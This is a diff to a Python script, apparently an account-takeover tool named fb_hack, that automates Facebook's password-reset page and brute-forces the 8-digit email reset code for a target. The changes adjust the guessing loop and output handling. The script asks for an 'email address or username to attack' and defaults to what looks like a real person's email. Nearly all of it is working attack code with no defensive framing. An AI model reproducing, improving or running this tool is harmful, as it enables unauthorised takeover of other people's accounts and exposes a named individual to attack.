@@ -140,11 +140,13 @@ def fb_hack(email, codex):
         soup = BeautifulSoup(response1, 'html.parser')
         check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
         if check2 != test:
-          print(s.join(fail, end='\r'))
+          print(s.join(fail))
           reset1 = attempt
           sleepy(30)
-          check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
         else:
+          response1 = browser.response()
+          with open("output1.html", "w") as file:
+            file.write(str(soup))
           sys.exit()
       except:
         response1 = browser.response()
@@ -155,37 +157,9 @@ def fb_hack(email, codex):
           file.write(str(soup))
         print("error")
         sys.exit()
-      with open("passcoder.txt", "a") as z:
-        z.write(str(reset1))
-        z.close()
-      response1 = browser.response()
-      soup = BeautifulSoup(response1, 'html.parser')
-      check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
-      if check2 != test:
-        print(s.join(fail))
-        count = 30
-        sleepy(count)
-      else:
-        soup = BeautifulSoup(response1, 'html.parser')
-        if soup.find(string="password_new") == test:
-          response1 = browser.response()
-          soup = BeautifulSoup(response1, 'html.parser')
-          with open("output1.html", "w") as file:
-            file.write(str(soup))
-          with open("output1.txt", "w") as file:
-            file.write(str(soup))
-          print("Password not found")
-          browser.close()
-        else:
-          print(s.join(success))
   else:
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
-    print(browser.geturl())
-    print(response1)
     if soup.find(string="password_new") == test:
       print("Passcode not found")
     elif soup.find(string="password_new") != test:
@@ -194,10 +168,7 @@ def fb_hack(email, codex):
       browser.close()
       reset = int(-1)
   return
-  
-  
-  
-  
+
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
